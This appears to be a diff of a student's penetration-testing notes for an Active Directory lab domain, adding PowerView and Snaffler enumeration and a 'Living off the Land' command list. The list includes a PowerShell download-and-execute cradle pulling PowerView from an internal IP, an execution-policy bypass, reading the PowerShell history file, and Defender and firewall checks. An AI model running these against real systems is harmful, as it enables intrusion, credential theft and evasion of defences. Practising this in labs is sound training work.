@@ -131,6 +131,7 @@ Get-ADGroup -Identity "Backup Operators"
 Get-ADGroupMember -Identity "Backup Operators"
 
 # PoverView
+## Special User
 Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
 
 Get-DomainGroupMember -Identity "Domain Admins" -Recurse
@@ -143,5 +144,30 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 
 # Snaffler
 
-.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data 
+.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt
+```
 
+# Living off the Land
+```
+hostname
+Get-Host
+powershell.exe -version 2
+[System.Environment]::OSVersion.Version
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+ipconfig /all
+set
+echo %USERDOMAIN%
+echo %logonserver%
+Systeminfo
+
+Get-Module
+Get-ExecutionPolicy -List
+Set-ExecutionPolicy Bypass -Scope Process ( script restriction-u deaktiv )
+Get-ChildItem Env: | ft Key,Value
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/PowerView.ps1'); ..." (
+
+netsh advfirewall show allprofiles
+sc query windefend
+Get-MpComputerStatus
+qwinsta
